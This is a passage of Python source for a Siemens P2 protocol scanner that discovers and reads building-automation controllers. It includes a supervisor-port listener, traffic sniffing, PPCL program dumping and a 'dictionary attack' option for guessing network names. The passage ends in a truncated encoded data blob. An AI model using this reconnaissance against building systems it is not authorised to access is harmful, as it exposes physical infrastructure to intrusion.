                            event['event'] = '2ndch_legacy' if msg_type == P2Message.TYPE_CONNECT else '2ndch_modern'

                    if 'event' in event:
                        emit(event)

                    # Send ACK
                    if ack_enabled:
                        ack = _build_ack_response(msg_type, seq, raw_payload,
                                                   SCANNER_NAME, P2_SITE)
                        if ack:
                            try:
                                csock.sendall(ack)
                            except socket.error:
                                pass
        except (socket.timeout, socket.error, ConnectionResetError):
            pass
        finally:
            try:
                csock.close()
            except Exception:
                pass
            with _inflight_lock:
                _inflight[0] -= 1
            if verbose:
                print(f"  [{port}] disconnect {peer[0]}:{peer[1]}")

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Bind to the operator-selected interface. Defaults to 0.0.0.0 for
    # backward compatibility, but a scanner host is routinely dual-homed
    # (corporate LAN on one NIC, automation VLAN on the other) and this
    # listener answers P2 — it should not be reachable from the corporate
    # side just because that is where the default route lives. Pass the
    # automation-VLAN address via --listen-bind to pin it.
    try:
        srv.bind((bind_address, port))
    except OSError as exc:
        srv.close()
        raise ScannerInputError(
            f"cannot bind {bind_address}:{port} — {exc}") from exc
    srv.listen(32)
    srv.settimeout(1.0)

    print(f"  Listening on {bind_address}:{port} for P2 push notifications...")
    if bind_address == '0.0.0.0':  # noqa: S104 - comparison, not a bind
        print("  [WARN] bound to all interfaces; use --listen-bind <ip> to "
              "restrict to the automation VLAN")
    print(f"  Scanner identity: {SCANNER_NAME}  |  BLN: {P2_NETWORK or '(not set)'}")
    print(f"  {'Press Ctrl+C to stop' if duration is None else f'Running for {duration}s'}")
    print()

    start = time.time()
    executor = ThreadPoolExecutor(max_workers=MAX_PEER_THREADS,
                                   thread_name_prefix='p2-listener')
    try:
        while True:
            if duration is not None and (time.time() - start) >= duration:
                break
            try:
                csock, peer = srv.accept()
            except socket.timeout:
                continue
            # Bound in-flight connections. accept() will happily keep taking
            # sockets past MAX_PEER_THREADS; without this they queue inside the
            # executor holding an open fd each, so a flood exhausts the process
            # fd limit even though only 32 are ever serviced. Refusing past the
            # cap is the honest signal to the peer.
            with _inflight_lock:
                at_capacity = _inflight[0] >= MAX_PEER_THREADS
            if at_capacity:
                if verbose:
                    print(f"  [{port}] refusing {peer[0]}:{peer[1]} — "
                          f"{MAX_PEER_THREADS} connections already in flight")
                try:
                    csock.close()
                except OSError:
                    pass
                continue
            with _inflight_lock:
                _inflight[0] += 1
            executor.submit(handle_connection, csock, peer)
    except KeyboardInterrupt:
        print("\n  Stopped.")
    finally:
        srv.close()
        # Don't wait — handle_connection's per-peer reads have their own
        # timeouts and any in-flight work will exit on its own. wait=False
        # gives Ctrl-C its expected snappy behavior.
        executor.shutdown(wait=False)
        if out_stream:
            out_stream.close()


def _format_event_line(event: Dict) -> str:
    """One-line human-readable rendering of a push event."""
    ts = time.strftime('%H:%M:%S')
    src = event.get('src_node', '?')
    ev = event.get('event', 'unknown')
    if ev == 'cov':
        return (f"{ts}  COV    {src:<12}  {event.get('device', ''):<14}  "
                f"{event.get('point', ''):<20}  "
                f"{event.get('value', '?'):>10}")
    if ev == 'virtual_push':
        return (f"{ts}  VIRT   {src:<12}  {'(panel)':<14}  "
                f"{event.get('point', ''):<20}  "
                f"{event.get('value', '?'):>10}")
    if ev == 'routing_table':
        names = [e['name'] for e in event.get('entries', [])]
        return (f"{ts}  ROUTE  {src:<12}  peers={event.get('peer_count', 0)}  "
                f"[{', '.join(names[:5])}" +
                (f", +{len(names)-5} more]" if len(names) > 5 else ']'))
    if ev == 'alarm':
        tslist = event.get('timestamps') or []
        return (f"{ts}  ALARM  {src:<12}  {event.get('point', ''):<20}  "
                f"val={event.get('value', '?')}  {tslist[0] if tslist else ''}")
    if ev in ('2ndch_legacy', '2ndch_modern'):
        return f"{ts}  2NDCH  {src:<12}  (2nd-channel identity)"
    return (f"{ts}  {ev:<6} {src:<12}  "
            f"msg_type={event.get('msg_type', '?')} op={event.get('opcode', '?')}")


# ═══════════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description='Siemens P2 Protocol Scanner — Read TEC/FLN points from PXC controllers',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # FIRST TIME — Learn network name from a pcap
  %(prog)s --pcap capture.pcapng --save site.json

  # FIRST TIME — Discover with known network name, save config
  %(prog)s --discover --range 192.0.2.0/24 --network MYBLN --save site.json

  # AFTER SETUP — Use saved config (no --network needed)
  %(prog)s --config site.json --discover --skip-portscan
  %(prog)s --config site.json -n NODE1 -d DEVICE1 --quick

  # OR — Just use --network directly every time
  %(prog)s --discover --range 192.0.2.0/24 --network MYBLN
  %(prog)s -n 192.0.2.50 -d DEVICE1 -p "ROOM TEMP" --network MYBLN

  # Discover + read every point on every device
  %(prog)s --network MYBLN --discover --range 192.0.2.0/24 --read-all

  # Get node firmware info
  %(prog)s --config site.json -n NODE1 --info

  # Discovery with firmware info for each node
  %(prog)s --config site.json --discover --skip-portscan --info

  # Multiple subnets (multiple buildings)
  %(prog)s --discover --range 192.0.2.0/24 --range 198.51.100.0/24 --network MYBLN

  # Decode a pcap file
  %(prog)s --pcap capture.pcapng

  # Show point table for an application
  %(prog)s --show-app 2023

Known nodes: """ + ', '.join(f"{n}={ip}" for n, ip in sorted(KNOWN_NODES.items()))
    )

    parser.add_argument('--node', '-n', help='PXC controller IP or node name')
    parser.add_argument('--device', '-d', help='TEC device name (e.g., DEVICE1)')
    parser.add_argument('--point', '-p', action='append',
                       help='Specific point(s) to read. Accepts point names '
                            '("ROOM TEMP") or slot numbers ("29"). Can be '
                            'passed multiple times.')
    parser.add_argument('--force-slot', action='store_true',
                       help='When reading by slot number, attempt the read '
                            'even if the slot is undefined in the app\'s '
                            'point table (for protocol troubleshooting).')
    parser.add_argument('--quick', '-q', action='store_true', help='Quick scan (key points only)')
    parser.add_argument('--read-delay', type=float, default=0.05, metavar='SECONDS',
                       help='Inter-read delay during a device scan (default: 0.05). '
                            'Raise on slow controllers or where you want to throttle '
                            'probe rate.')
    parser.add_argument('--discover', action='store_true', help='Discover nodes and devices')
    parser.add_argument('--range', '-r', action='append',
                       help='IP range to scan. Formats: 192.0.2.0/24, 192.0.2.1-254, '
                            '192.0.2, or single IP. Can specify multiple times.')
    parser.add_argument('--skip-portscan', action='store_true',
                       help='Skip port scan during discovery (use known nodes)')
    parser.add_argument('--with-panel', action='store_true',
                       help='Also scan panel-level points during discovery')
    parser.add_argument('--read-all', action='store_true',
                       help='Read all points on every discovered device')
    parser.add_argument('--network', help='P2 network name (auto-learned if not set)')
    parser.add_argument('--scanner-name', default=None,
                       help=f'Scanner identity on P2 network (overrides config; default from config or {SCANNER_NAME!r})')
    parser.add_argument('--config', help='Load site config from JSON file')
    parser.add_argument('--save', help='Save learned config to JSON file')
    parser.add_argument('--browse', '-b', action='store_true', help='Browse devices on a node')
    parser.add_argument('--info', action='store_true',
                       help='Show node firmware/revision info during discovery')
    parser.add_argument('--verify', action='store_true',
                       help='Verify which devices are actually online after discovery')
    parser.add_argument('--online', action='store_true',
                       help='Only show devices confirmed online (implies --verify)')
    parser.add_argument('--offline', action='store_true',
                       help='Only show devices confirmed offline (implies --verify)')
    parser.add_argument('--pcap', help='Decode a pcap/pcapng file')
    parser.add_argument('--sniff', nargs='?', const=10, type=int, metavar='SECONDS',
                       help='Live capture P2 traffic to learn network name (requires tshark/Wireshark, default 10s)')
    parser.add_argument('--scan-network', action='store_true', help='Probe all known nodes')
    parser.add_argument('--cold-discover', action='store_true',
                       help='Discover BLN/scanner/node names on an unknown site. '
                            'Uses BACnet recon + Cartesian dictionary attack.')
    parser.add_argument('--auto-discover', action='store_true',
                       help='Polished one-shot cold discovery: auto-detects '
                            'local subnet (if --range omitted), port-scans '
                            'TCP/5033, bootstraps BLN + supervisor + per-panel '
                            'names via 0x0050, then writes site.json (use '
                            '--save PATH; defaults to ./site.json).')
    parser.add_argument('--pxc', action='append', default=[],
                       help='For --cold-discover: known PXC IP (skips port scan)')
    parser.add_argument('--site-hint',
                       help='For --cold-discover: override BACnet-inferred prefix')
    parser.add_argument('--bacnet-duration', type=int, default=30,
                       help='For --cold-discover: BACnet listen seconds (default 30)')
    parser.add_argument('--bacnet-interface', default='0.0.0.0',
                       help='For --cold-discover: bind interface (default 0.0.0.0)')
    parser.add_argument('--skip-bacnet', action='store_true',
                       help='For --cold-discover: skip BACnet phase')
    parser.add_argument('--force-full', action='store_true',
                       help='For --cold-discover: enable exhaustive tier 3 sweep')
    parser.add_argument('--cold-delay', type=float, default=0.3,
                       help='For --cold-discover: delay between probes (default 0.3)')
    parser.add_argument('--debug-reads', action='store_true',
                       help='Print raw hex when a point-read fails to parse '
                            '(helpful for diagnosing unusual response shapes)')
    parser.add_argument('--format', '-f', choices=['table', 'json', 'csv'], default='table',
                       help='Output format (default: table)')
    parser.add_argument('--list-nodes', action='store_true', help='List known PXC nodes')
    parser.add_argument('--show-app', type=int, help='Show point table for TEC application')
    parser.add_argument('--port', type=int, default=None, help='P2 ALN port (default: 5033). Override only where the configured P2 port is not 5033 — e.g. a site where a Datamate Advanced co-install bumped the supervisor listener to another port.')

    # ── New capabilities (supervisor-port listener, 0x010C/0x0981/0x0985 opcodes) ──
    parser.add_argument('--listen-push', nargs='?', const=0, type=int, metavar='SECONDS',
                        help='Bind to the supervisor port (default 5033) and collect PXC push notifications '
                             '(COV events, BLN virtual updates, routing tables). '
                             'No SECONDS = run until Ctrl+C.')
    parser.add_argument('--listen-port', type=int, default=5033,
                        help='Port for --listen-push (default: 5033 — Siemens-canonical supervisor port per 149-1006; override if your site uses a different port, e.g. 5034 for DMA-collision installs)')
    parser.add_argument('--listen-bind', metavar='IP', default='0.0.0.0',  # noqa: S104 - documented default; see listen_for_push_notifications
                        help='Local interface address for --listen-push '
                             '(default: 0.0.0.0, all interfaces). Set this to '
                             'the automation-VLAN address on a dual-homed host '
                             'so the listener is not exposed on the corporate side.')
    parser.add_argument('--listen-output', metavar='FILE',
                        help='Write captured events to FILE (default: stdout)')
    parser.add_argument('--listen-no-ack', action='store_true',
                        help="Don't ACK incoming pushes (safer if a real DCC is "
                             "also on the network)")
    parser.add_argument('--walk-points', action='store_true',
                        help='Use opcode 0x0981 to enumerate every point on a '
                             'panel (more complete than 0x0986 FLN enumerate). '
                             'Requires -n NODE.')
    parser.add_argument('--dump-programs', action='store_true',
                        help='Use opcode 0x0985 to read PPCL program source from a '
                             'panel. Requires -n NODE.')
    parser.add_argument('--sysinfo-compact', action='store_true',
                        help='Use opcode 0x010C (newer firmware) for panel info. '
                             'Complements --info which uses legacy 0x0100. '
                             'Requires -n NODE.')

    args = parser.parse_args()

    # Hoist all module-globals this function reassigns into a single
    # declaration at the top — Python disallows `global X` after the same
    # function has already assigned X, so per-branch globals would race.
    global P2_SITE, DEBUG_READS, P2_PORT

    # Load site config if specified (optional — file doesn't need to exist yet)
    if args.config:
        if os.path.exists(args.config):
            load_config(args.config)
        else:
            print(f"  Config file {args.config} not found — will create after discovery")

    # Apply CLI overrides (take precedence over config file)
    if args.network:
        _set_network(args.network)
    if args.scanner_name:
        _set_scanner_name(args.scanner_name)
    if args.debug_reads:
        DEBUG_READS = True
    if args.port is not None:        # CLI --port overrides the 5033 default (and any config)
        P2_PORT = args.port

    # ─── Polished auto-discovery — validated 2-packet primitive.
    #     Auto-detects the local subnet if --range omitted. Requires the
    #     BLN name as input (--network) since wrong-BLN handshakes
    #     TCP-RST without giving us anything to learn from. Prefers an
    #     explicit --network flag, falls back to the BLN loaded from
    #     --config site.json, and errors out if neither is set.
    if args.auto_discover:
        save_target = args.save or os.path.join(os.getcwd(), 'site.json')
        network = args.range[0] if args.range else None
        bln_for_discover = args.network or P2_NETWORK
        if not bln_for_discover or bln_for_discover == 'MYBLN':
            print(f"\n  ERROR: --auto-discover requires the BLN name.")
            print(f"  Pass --network <YOUR-BLN> (or have it set in your "
                  f"loaded site.json's p2_network key).")
            print(f"  Look it up in Desigo CC > System Browser > Field "
                  f"Networks, or sniff a supervisor-port frame.")
            sys.exit(1)
        result = polished_cold_discover(
            network=network,
            bln=bln_for_discover,
            save_to=save_target,
            probe_delay=args.cold_delay,
            verbose=True,
        )
        if not result:
            return
        # Also propagate into in-process globals so any downstream flags
        # in the same invocation (e.g. --auto-discover --read-all) work.
        _set_network(result.get('p2_network', ''))
        _set_scanner_name(result.get('scanner_name', _GENERIC_SCANNER_NAME))
        P2_SITE = result.get('p2_site', '')
        KNOWN_NODES.clear()
        KNOWN_NODES.update(result.get('known_nodes', {}))
        return

    # ─── Cold-site discovery — runs before the network-name check since
    #     the whole point is to discover the network name.
    if args.cold_discover:
        result = cold_discover_site(
            ranges=args.range,
            pxc_ips=args.pxc if args.pxc else None,
            site_hint=args.site_hint,
            bacnet_duration=args.bacnet_duration,
            bacnet_interface=args.bacnet_interface,
            skip_bacnet=args.skip_bacnet,
            force_full=args.force_full,
            delay=args.cold_delay,
            verbose=False,
        )
        if result and args.save:
            # Apply discovered values to globals, then save
            _set_network(result['p2_network'])
            _set_scanner_name(result['scanner_name'])
            P2_SITE = result['p2_site']
            KNOWN_NODES.update(result['known_nodes'])
            save_config(args.save)
            print(f"\n  Saved to {args.save}")
        elif result:
            print(f"\n  To save: rerun with --save site.json")
        return

    # ─── Passive supervisor-port listener — doesn't need the network name; extracts identity
    #     from incoming packets. Runs in its own event loop until Ctrl+C or duration.
    if args.listen_push is not None:
        listen_for_push_notifications(
            port=args.listen_port,
            bind_address=args.listen_bind,
            duration=args.listen_push if args.listen_push > 0 else None,
            output_format='json' if args.format == 'json' else 'table',
            output_file=args.listen_output,
            ack_enabled=not args.listen_no_ack,
            verbose=args.debug_reads,
        )
        return

    # Check if we have what we need for P2 communication
    if not P2_NETWORK and not args.pcap and not args.show_app and not args.list_nodes:
        # Try sniffing if requested or if we need the network name
        if hasattr(args, 'sniff') and args.sniff:
            print(f"\n  Sniffing for P2 traffic...")
            name = sniff_network_name(duration=args.sniff)
            if name:
                print(f"  Learned network: {P2_NETWORK}  |  Site: {P2_SITE}")
                if args.save:
                    save_config(args.save)
                elif args.config:
                    save_config(args.config)
            else:
                print(f"  Could not learn network name from live traffic.")
                print(f"  Make sure this machine can see P2 traffic (same VLAN as BAS).")
                if not (args.range or args.node):
                    return

        # Still no network name?
        if not P2_NETWORK and (args.range or args.node):
            # Try auto-sniff before giving up
            if not (hasattr(args, 'sniff') and args.sniff):
                print(f"\n  Attempting to sniff P2 traffic for network name...")
                name = sniff_network_name(duration=5)
                if name:
                    print(f"  Learned network: {P2_NETWORK}")
                    
            if not P2_NETWORK:
                print(f"\n  ⚠ P2 network name required.")
                print(f"    PXC controllers won't respond without the correct network name.")
                print(f"")
                print(f"    Options:")
                print(f"      --network NAME         Specify it directly (e.g. --network MYBLN)")
                print(f"      --pcap FILE            Learn it from a Wireshark capture")
                print(f"      --sniff [SECONDS]      Live capture to auto-learn (needs tshark)")
                print(f"      --config FILE          Load from a saved config")
                print(f"")
                print(f"    To get the network name:")
                print(f"      1. Check Desigo CC → Field Networks → BLN name")
                print(f"      2. Or: grab a 5-second Wireshark capture on the BAS server,")
                print(f"         then: p2_scanner.py --pcap capture.pcapng")
                print(f"      3. Or: run on the BAS server: p2_scanner.py --sniff 10")
                return

    # List nodes
    if args.list_nodes:
        print(f"\nKnown P2 nodes on {P2_NETWORK}:")
        for name, ip in sorted(KNOWN_NODES.items()):
            print(f"  {name:<10s} {ip}")
        return

    # Show application point table
    if args.show_app:
        pt_table = get_point_table(args.show_app)
        print(f"\nTEC Application {args.show_app} — {len(pt_table)} subpoints:")
        print(f"  {'Addr':>4s}  {'Name':<25s} {'Units':<8s} {'RO':<4s} Description")
        print(f"  {'─' * 4}  {'─' * 25} {'─' * 8} {'─' * 4} {'─' * 30}")
        for addr, (name, desc, units, ro) in pt_table.items():
            ro_str = "RO" if ro else "RW"
            print(f"  {addr:>4d}  {name:<25s} {units:<8s} {ro_str:<4s} {desc}")
        return

    # Decode pcap
    if args.pcap:
        sniff_pcap(args.pcap, args.format)
        if args.save and P2_NETWORK:
            save_config(args.save)
        elif P2_NETWORK and not args.save:
            print(f"\n  Learned network: {P2_NETWORK}  |  Site: {P2_SITE}")
            print(f"  Tip: use --save site.json to save this for future scans")
        return

    # Standalone sniff mode
    if hasattr(args, 'sniff') and args.sniff and not args.discover and not args.node:
        print(f"\n  Sniffing for P2 traffic ({args.sniff} seconds)...")
        name = sniff_network_name(duration=args.sniff)
        if name:
            print(f"\n  Network: {P2_NETWORK}  |  Site: {P2_SITE}")
            if args.save:
                save_config(args.save)
            else:
                print(f"  Use --save site.json to save for future scans")
        else:
            print(f"\n  No P2 traffic detected.")
            print(f"  Make sure this machine is on the BAS VLAN and tshark is installed.")
        return

    # Discovery mode
    if args.discover:
        if args.node and not args.range:
            # Discover devices on a single node
            host = KNOWN_NODES.get(args.node.upper(), args.node)
            node_name = args.node.upper() if args.node.upper() in KNOWN_NODES else None
            if not node_name:
                print(f"  Identifying node at {host}...")
                node_name = discover_node_name(host)
                if not node_name:
                    node_name = "UNKNOWN"
            print(f"\n{'═' * 70}")
            print(f"  DISCOVERING DEVICES ON {node_name} ({host})")

            if args.info:
                info = get_node_info(host, node_name)
                if info:
                    print(f"  Firmware: {info['firmware']}  Model: {info['model']}")
                    if info['extra']:
                        print(f"  Extra: {info['extra']}")

            print(f"{'═' * 70}")
            devs = discover_devices_on_node(host, node_name)
            if args.with_panel:
                print(f"\n  Scanning panel-level points...")
                panel_pts = discover_panel_points(host, node_name)
                for pt in panel_pts:
                    print(f"    {pt['point']:<35s} = {pt['value']:>10.2f} {pt.get('units', '')}")
            print(f"\n  Found {len(devs)} configured devices on {node_name}")

            # Verify online status if requested
            should_verify = args.verify or args.online or args.offline
            if should_verify and devs:
                show_filter = "online" if args.online else ("offline" if args.offline else "all")
                verify_devices(host, node_name, devs, show_filter=show_filter)
            else:
                for d in devs:
                    desc = d.get('description', '')
                    desc_str = f"  ({desc})" if desc else ""
                    app_label = format_app_label(d['application'])
                    print(f"    {d['device']:<20s}  {app_label}{desc_str}")

            # If --read-all, scan every discovered device
            if args.read_all and devs:
                print(f"\n{'═' * 70}")
                print(f"  READING ALL POINTS")
                print(f"{'═' * 70}")
                # If verified, only read online devices
                for d in devs:
                    if should_verify and d.get('status') == 'offline':
                        continue
                    scan_device(host, d['device'], output_format=args.format,
                                inter_read_delay_s=args.read_delay)
        else:
            # Full network discovery
            if not args.range:
                print("ERROR: full-network discovery requires --range. "
                      "Example: --range 192.0.2.0/24 (or comma-separated CIDRs).")
                return 1
            ip_ranges = ','.join(args.range)
            # Determine verify filter
            verify_filter = None
            if args.online:
                verify_filter = "online"
            elif args.offline:
                verify_filter = "offline"
            elif args.verify:
                verify_filter = "all"

            discover_network(
                ip_ranges=ip_ranges,
                scan_ports=not args.skip_portscan,
                scan_devices=True,
                scan_panel=args.with_panel,
                scan_info=args.info,
                verify=verify_filter,
                read_all=args.read_all,
                output_format=args.format,
                read_points=args.point,
                inter_read_delay_s=args.read_delay,
            )
        if args.save and P2_NETWORK:
            save_config(args.save)
        elif args.config and P2_NETWORK:
            save_config(args.config)  # Auto-save back to config file
        return

    # Network scan (legacy, simpler than discover)
    if args.scan_network:
        scan_network(args.quick)
        return

    # Resolve node name to IP
    if args.node:
        host = KNOWN_NODES.get(args.node.upper(), args.node)
    else:
        parser.print_help()
        return

    # ── New opcode-based operations (require -n NODE) ──
    if args.sysinfo_compact:
        node_name = args.node.upper() if args.node.upper() in KNOWN_NODES else args.node
        print(f"\n  Compact sysinfo for {node_name} ({host}) via opcode 0x010C...")
        conn = P2Connection(host)
        if conn.connect(node_name.lower()):
            info = conn.read_system_info_compact(node_name.lower())
            conn.close()
            if info:
                print(f"  Model:      {info['model']}")
                print(f"  Firmware:   {info['firmware']}")
                print(f"  Build date: {info['build_date']}")
                if args.format == 'json':
                    print(json.dumps(info, indent=2))
            else:
                print(f"  No response (panel may not support 0x010C — try --info for legacy 0x0100)")
        else:
            print(f"  Could not connect to {host}")
        return

    if args.walk_points:
        node_name = args.node.upper() if args.node.upper() in KNOWN_NODES else args.node
        print(f"\n  Walking all points on {node_name} ({host}) via opcode 0x0981...")
        conn = P2Connection(host)
        if not conn.connect(node_name.lower()):
            print(f"  Could not connect to {host}")
            return
        points = conn.enumerate_all_points(node_name.lower())
        conn.close()
        print(f"  Found {len(points)} points")
        if args.format == 'json':
            print(json.dumps(points, indent=2, default=str))
        elif args.format == 'csv':
            print("device,point,value,units,description")
            for p in points:
                v = '' if p.get('value') is None else f"{p['value']:g}"
                desc = p.get('description', '').replace(',', ';')
                print(f"{p['device']},{p['point']},{v},{p.get('units', '')},{desc}")
        else:
            print(f"\n  {'Device':<28} {'Point':<22} {'Value':>10} {'Units':<8} {'Description':<24}")
            print(f"  {'-'*28} {'-'*22} {'-'*10} {'-'*8} {'-'*24}")
            for p in points:
                v = '' if p.get('value') is None else f"{p['value']:g}"
                desc = p.get('description', '')
                print(f"  {p['device']:<28.28} {p['point']:<22.22} {v:>10} "
                      f"{p.get('units', ''):<8.8} {desc:<24.24}")
        return

    if args.dump_programs:
        node_name = args.node.upper() if args.node.upper() in KNOWN_NODES else args.node
        print(f"\n  Reading PPCL programs from {node_name} ({host}) via opcode 0x0985...")
        conn = P2Connection(host)
        if not conn.connect(node_name.lower()):
            print(f"  Could not connect to {host}")
            return
        programs = conn.read_programs(node_name.lower())
        conn.close()
        total_lines = sum(p['code'].count('\n') + 1 for p in programs if p.get('code'))
        print(f"  Found {len(programs)} programs, ~{total_lines} total source lines\n")
        if args.format == 'json':
            print(json.dumps(programs, indent=2))
        else:
            for p in programs:
                print(f"  {'='*72}")
                module_str = f" [{p['module']}]" if p.get('module') else ''
                print(f"  PROGRAM: {p['name']}{module_str}")
                print(f"  {'='*72}")
                # Indent the code two spaces for readability; preserve blank lines
                for line in p.get('code', '').split('\n'):
                    print(f"    {line}")
                print()
        return

    # Device scan
    if args.device:
        try:
            results = scan_device(host, args.device, args.point, args.quick,
                                  args.format, force_slot=args.force_slot,
                                  inter_read_delay_s=args.read_delay)
        except ScannerInputError as e:
            print(f"\n  [ERROR] {e}")
            sys.exit(2)
        # Exit 1 if the scan completed but yielded no successful reads —
        # lets cron jobs and parent processes detect "I ran but found nothing"
        # without having to parse stdout.
        if not results:
            sys.exit(1)
    elif args.info:
        # Standalone node info query
        node_name = args.node.upper() if args.node.upper() in KNOWN_NODES else None
        if not node_name:
            node_name = discover_node_name(host)
            if not node_name:
                node_name = "UNKNOWN"
        print(f"\n  Querying {node_name} ({host})...")
        info = get_node_info(host, node_name)
        if info:
            print(f"  Firmware: {info['firmware']}")
            print(f"  Model:    {info['model']}")
            if info['extra']:
                print(f"  Extra:    {info['extra']}")
            if info.get('raw_strings'):
                print(f"  Raw:      {info['raw_strings']}")
        else:
            print(f"  Could not get info (node may not support opcode 0x0100)")
    elif args.browse:
        print(f"  Use --discover instead: p2_scanner.py --node {args.node} --discover")
    else:
        parser.print_help()


# ── Embedded FLN/TEC application point catalog ─────────────────────────
# gzip+base64 of the FLN/TEC point-table database, decoded on demand by
# _load_tecpnts_db(). Lets the scanner run as one self-contained file; an external
# p2_scanner_data/tecpoints.json (or tecpnts.json) found at runtime overrides it.
_TECPOINTS_GZ_B64 = (
    "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"
